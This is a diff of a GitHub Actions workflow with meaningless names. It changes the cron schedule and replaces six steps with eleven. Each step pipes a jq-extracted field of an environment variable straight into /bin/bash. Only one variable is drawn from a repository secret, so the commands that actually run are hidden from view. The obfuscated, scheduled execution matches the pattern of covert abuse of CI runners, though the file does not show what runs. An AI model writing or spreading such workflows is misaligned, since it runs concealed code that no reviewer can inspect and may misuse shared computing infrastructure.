@@ -1,21 +1,29 @@
 name: hukaljx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 3/6 * * *'
+    - cron: '58 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hukaljx
         env:
-          bqba55: ${{ secrets.bqba55 }}
+          e8980: ${{ secrets.e8980 }}
         run: |
-          echo $bqba55 | jq -r .l43626 | /bin/bash
-          echo $ra90737 | jq -r .azx67 | /bin/bash
-          echo $hvtkk81 | jq -r .o4 | /bin/bash
-          echo $chy41888 | jq -r .zir5509 | /bin/bash
-          echo $zvlmz34 | jq -r .puvxz53 | /bin/bash
-          echo $biqgw2113 | jq -r .hlk8881 | /bin/bash
+          echo $e8980 | jq -r .f515 | /bin/bash
+          echo $mnxvs5071 | jq -r .ssss8149 | /bin/bash
+          echo $vpet56991 | jq -r .acqla75091 | /bin/bash
+          echo $pic4287 | jq -r .s7 | /bin/bash
+          echo $ivsia3 | jq -r .f69709 | /bin/bash
+          echo $trimu5 | jq -r .o05 | /bin/bash
+          echo $gwuj4 | jq -r .fgkkk52 | /bin/bash
+          echo $c775 | jq -r .k702 | /bin/bash
+          echo $smy84 | jq -r .nz33777 | /bin/bash
+          echo $g6390 | jq -r .aq2 | /bin/bash
+          echo $plfb96401 | jq -r .e4216 | /bin/bash
 
